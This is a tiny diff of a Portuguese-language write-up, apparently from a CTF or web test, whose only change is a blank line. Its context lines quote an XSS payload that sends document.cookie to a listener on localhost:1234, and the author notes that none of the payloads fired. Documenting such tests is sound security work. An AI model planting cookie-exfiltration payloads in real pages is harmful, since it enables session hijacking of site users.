@@ -97,6 +97,7 @@ Testei algumas payloads comuns:
 <img src=x onerror="window.location='http://localhost:1234/?'+document.cookie;">
 ```
 (Obs.: em localhost, deve-se passar o endereco do ip correto da maquina conectada.)
+
 Porém, nenhuma delas resultou em requisições ao meu servidor — indicando que o campo pode estar sanitizando entradas ou que o XSS ocorre em outro ponto do fluxo.
 
 ---
